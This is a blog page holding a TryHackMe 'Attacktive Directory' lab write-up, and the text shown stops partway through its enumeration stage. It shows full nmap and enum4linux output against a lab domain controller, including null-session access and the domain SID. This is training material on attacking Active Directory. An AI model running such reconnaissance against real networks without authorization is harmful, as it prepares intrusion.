<!DOCTYPE html>  
<html lang=""><link rel="stylesheet" href="../../css/style.css" type="text/css" media="all" />  

<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="THM Attacktive Directory Writeup &middot; Gabe Roberts Blog">
<meta property="og:description" content="THM &amp;amp;ldquo;Attacktive Directory&amp;amp;rdquo; Writeup This is a room in TryHackMe dedicated to performing attacks on active directory and kerberos.
Enumeration To begin we will begin with our standard all ports, scripts, and services nmap scan. I will also run some stuff like enum4linux since I know this is an AD box.
1Nmap scan report for 10.10.157.30 2Host is up (0.22s latency). 3Not shown: 65509 closed tcp ports (conn-refused) 4PORT STATE SERVICE VERSION 553/tcp open domain Simple DNS Plus 680/tcp open http Microsoft IIS httpd 10.">
<meta property="og:url" content="https://contactroberts.com/blog/07-10-2023_thm_attacktive_directory/">
<meta property="og:site_name" content="Gabe Roberts Blog">
<meta property="og:image" content="">
<meta property="og:image:secure_url" content="">



<meta property="article:published_time" content="2023-07-10T00:00:00Z">

<body><header>  
    <nav class="navbar" role="navigation">  
        <div class="navbar__left">  
            <a href="../../">Gabe Roberts</a>  
        </div>  
        <div class="">  
            <a href="../../blog">Blogs</a>  
            <span class ="nav-item navbar-text mx-1">&emsp;/&emsp;</span>
            <a href="../../tags/">Tags</a>  
            <span class ="nav-item navbar-text mx-1">&emsp;/&emsp;</span>
            <a href="../../pages/">Other</a>  
        </div>  
    </nav>  
</header>  
<main>  
<section class="section">  
  <article>  
    <div class="blog__container">  
          <h1 class="blog__title">THM Attacktive Directory Writeup</h1>  

          <p> All AD all the time. </p>
          <p>Published: July 10, 2023</p>
          <p>Reading Time: 9  minutes <p>

            <div class="blog__details">  
              <div class="blog__info">  
              </div>  
            </div>  
          <div class="content">  
            <h1 id="thm-attacktive-directory-writeup">THM &ldquo;Attacktive Directory&rdquo; Writeup</h1>
<p>This is a room in TryHackMe dedicated to performing attacks on active directory and kerberos.</p>
<h2 id="enumeration">Enumeration</h2>
<p>To begin we will begin with our standard all ports, scripts, and services nmap scan. I will also run some stuff like <code>enum4linux</code> since I know this is an AD box.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span>Nmap scan report <span style="color:#fe8019">for</span> 10.10.157.30
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>Host is up <span style="color:#fe8019">(</span>0.22s latency<span style="color:#fe8019">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>Not shown: <span style="color:#d3869b">65509</span> closed tcp ports <span style="color:#fe8019">(</span>conn-refused<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span>80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span>| http-methods:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span>|_http-title: IIS Windows Server
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#fe8019">(</span>server time: 2023-07-10 23:51:59Z<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">13</span><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">14</span><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">15</span><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#fe8019">(</span>Domain: spookysec.local0., Site: Default-First-Site-Name<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">16</span><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">17</span><span>464/tcp   open  kpasswd5?
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">18</span><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">19</span><span>636/tcp   open  tcpwrapped
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">20</span><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#fe8019">(</span>Domain: spookysec.local0., Site: Default-First-Site-Name<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">21</span><span>3269/tcp  open  tcpwrapped
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">22</span><span>3389/tcp  open  ms-wbt-server Microsoft Terminal Services
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">23</span><span>| rdp-ntlm-info:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">24</span><span>|   Target_Name: THM-AD
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">25</span><span>|   NetBIOS_Domain_Name: THM-AD
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">26</span><span>|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">27</span><span>|   DNS_Domain_Name: spookysec.local
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">28</span><span>|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">29</span><span>|   DNS_Tree_Name: spookysec.local
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">30</span><span>|   Product_Version: 10.0.17763
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">31</span><span>|_  System_Time: 2023-07-10T23:52:59+00:00
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">32</span><span>|_ssl-date: 2023-07-10T23:53:09+00:00; +1s from scanner time.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">33</span><span>| ssl-cert: Subject: commonName<span style="color:#fe8019">=</span>AttacktiveDirectory.spookysec.local
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">34</span><span>| Issuer: commonName<span style="color:#fe8019">=</span>AttacktiveDirectory.spookysec.local
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">35</span><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">36</span><span>| Public Key bits: <span style="color:#d3869b">2048</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">37</span><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">38</span><span>| Not valid before: 2023-07-09T22:53:02
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">39</span><span>| Not valid after:  2024-01-08T22:53:02
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">40</span><span>| MD5:   2ad1:6073:f250:3300:2d76:f1b8:f508:72c8
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">41</span><span>|_SHA-1: d622:5699:e530:bc81:d88e:90fb:8a23:6428:98cb:6cb4
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">42</span><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#fe8019">(</span>SSDP/UPnP<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">43</span><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">44</span><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">45</span><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">46</span><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#fe8019">(</span>SSDP/UPnP<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">47</span><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">48</span><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">49</span><span>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">50</span><span>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">51</span><span>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">52</span><span>49669/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">53</span><span>49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">54</span><span>49672/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">55</span><span>49673/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">56</span><span>49677/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">57</span><span>49684/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">58</span><span>49694/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">59</span><span>Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">60</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">61</span><span>Host script results:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">62</span><span>| smb2-security-mode:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">63</span><span>|   3:1:1:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">64</span><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">65</span><span>| smb2-time:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">66</span><span>|   date: 2023-07-10T23:53:03
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">67</span><span>|_  start_date: N/A
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">  1</span><span><span style="color:#fe8019">[</span>~/thm/attacktive<span style="color:#fe8019">]</span>$ enum4linux 10.10.157.30
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">  2</span><span>Starting enum4linux v0.9.1 <span style="color:#fe8019">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span style="color:#fe8019">)</span> on Mon Jul <span style="color:#d3869b">10</span> 18:54:38 2023
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">  3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">  4</span><span> <span style="color:#fe8019">=========================================(</span> Target Information <span style="color:#fe8019">)=========================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">  5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">  6</span><span>Target ........... 10.10.157.30
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">  7</span><span>RID Range ........ 500-550,1000-1050
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">  8</span><span>Username ......... <span style="color:#b8bb26">&#39;&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">  9</span><span>Password ......... <span style="color:#b8bb26">&#39;&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 10</span><span>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 13</span><span> <span style="color:#fe8019">============================(</span> Enumerating Workgroup/Domain on 10.10.157.30 <span style="color:#fe8019">)============================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 16</span><span><span style="color:#fe8019">[</span>E<span style="color:#fe8019">]</span> Can<span style="color:#b8bb26">&#39;t find workgroup/domain
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 17</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 18</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 19</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 20</span><span><span style="color:#b8bb26"> ================================( Nbtstat Information for 10.10.157.30 )================================
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 21</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 22</span><span><span style="color:#b8bb26">Looking up status of 10.10.157.30
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 23</span><span><span style="color:#b8bb26">No reply from 10.10.157.30
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 24</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 25</span><span><span style="color:#b8bb26"> ===================================( Session Check on 10.10.157.30 )===================================
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 26</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 27</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 28</span><span><span style="color:#b8bb26">[+] Server 10.10.157.30 allows sessions using username &#39;&#39;, password &#39;&#39;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 29</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 30</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 31</span><span><span style="color:#b8bb26"> ================================( Getting domain SID for 10.10.157.30 )================================
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 32</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 33</span><span><span style="color:#b8bb26">Domain Name: THM-AD
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 34</span><span><span style="color:#b8bb26">Domain Sid: S-1-5-21-3591857110-2884097990-301047963
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 35</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 36</span><span><span style="color:#b8bb26">[+] Host is part of a domain (not a workgroup)
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 37</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 38</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 39</span><span><span style="color:#b8bb26"> ===================================( OS information on 10.10.157.30 )===================================
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 40</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 41</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 42</span><span><span style="color:#b8bb26">[E] Can&#39;</span>t get OS info with smbclient
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 43</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 44</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 45</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Got OS info <span style="color:#fe8019">for</span> 10.10.157.30 from srvinfo:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 46</span><span>do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 47</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 48</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 49</span><span> <span style="color:#fe8019">=======================================(</span> Users on 10.10.157.30 <span style="color:#fe8019">)=======================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 50</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 51</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 52</span><span><span style="color:#fe8019">[</span>E<span style="color:#fe8019">]</span> Couldn<span style="color:#b8bb26">&#39;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 53</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 54</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 55</span><span><span style="color:#b8bb26">
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 56</span><span><span style="color:#b8bb26">[E] Couldn&#39;</span>t find users using enumdomusers: NT_STATUS_ACCESS_DENIED
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 57</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 58</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 59</span><span> <span style="color:#fe8019">=================================(</span> Share Enumeration on 10.10.157.30 <span style="color:#fe8019">)=================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 60</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 61</span><span>do_connect: Connection to 10.10.157.30 failed <span style="color:#fe8019">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span style="color:#fe8019">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 62</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 63</span><span>        Sharename       Type      Comment
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 64</span><span>        ---------       ----      -------
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 65</span><span>Reconnecting with SMB1 <span style="color:#fe8019">for</span> workgroup listing.
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 66</span><span>Unable to connect with SMB1 -- no workgroup available
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 67</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 68</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Attempting to map shares on 10.10.157.30
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 69</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 70</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 71</span><span> <span style="color:#fe8019">============================(</span> Password Policy Information <span style="color:#fe8019">for</span> 10.10.157.30 <span style="color:#fe8019">)============================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 72</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 73</span><span>
